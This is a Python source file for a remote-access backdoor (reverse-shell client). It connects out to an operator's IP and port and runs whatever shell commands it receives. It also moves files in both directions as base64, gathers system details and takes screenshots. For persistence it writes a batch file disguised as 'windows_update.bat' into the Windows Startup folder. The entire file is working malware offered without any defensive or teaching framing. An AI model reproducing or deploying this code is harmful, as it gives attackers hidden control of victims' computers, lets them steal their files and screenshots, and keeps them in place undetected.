import base64
import json
import os
import platform
import socket
import subprocess
import tempfile


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(4096)
                if not chunk:
                    return None
                json_data += chunk
                return json.loads(json_data.decode())
            except (ValueError, json.JSONDecodeError):
                continue

    def execute_system_command(self, command):
        if isinstance(command, list):
            command = " ".join(command)
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()

    def change_working_directory(self, path):
        os.chdir(path)
        return f"[+] Working directory changed to {path}"

    def get_system_info(self):
        try:
            system_info = subprocess.check_output(
                "whoami && hostname && systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
                shell=True,
                stderr=subprocess.STDOUT,
            ).decode()
        except Exception:
            system_info = (
                f"Hostname: {socket.gethostname()}\n"
                f"System: {platform.system()}\n"
                f"Release: {platform.release()}\n"
                f"Version: {platform.version()}\n"
            )
        return system_info

    def persist(self):
        try:
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            os.makedirs(startup_folder, exist_ok=True)
            payload_path = os.path.join(startup_folder, "windows_update.bat")
            script = f'@echo off\r\nstart "" "{os.sys.executable}" "{__file__}"\r\n'
            with open(payload_path, "w", encoding="utf-8") as file:
                file.write(script)
            return "[+] Persistence enabled."
        except Exception as error:
            return f"[!] Persistence failed: {error}"

    def take_screenshot(self):
        try:
            from PIL import ImageGrab
        except ImportError:
            return "[!] Pillow is not installed. Install it with: pip install pillow"

        file_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        screenshot = ImageGrab.grab()
        screenshot.save(file_path)
        return file_path

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def write_file(self, path, content):
        if isinstance(content, str):
            content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content)
        return "[+] Upload successful."

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
            except ConnectionError:
                print("[!] Connection closed by server.")
                break
            if not command:
                print("[!] Server disconnected.")
                break
            if command[0] == "exit":
                self.connection.close()
                break
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            elif command[0] == "download" and len(command) > 1:
                command_result = base64.b64encode(self.read_file(command[1])).decode()
            elif command[0] == "upload" and len(command) > 2:
                command_result = self.write_file(command[1], command[2])
            elif command[0] == "system_info":
                command_result = self.get_system_info()
            elif command[0] == "persist":
                command_result = self.persist()
            elif command[0] == "screenshot":
                command_result = self.take_screenshot()
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

    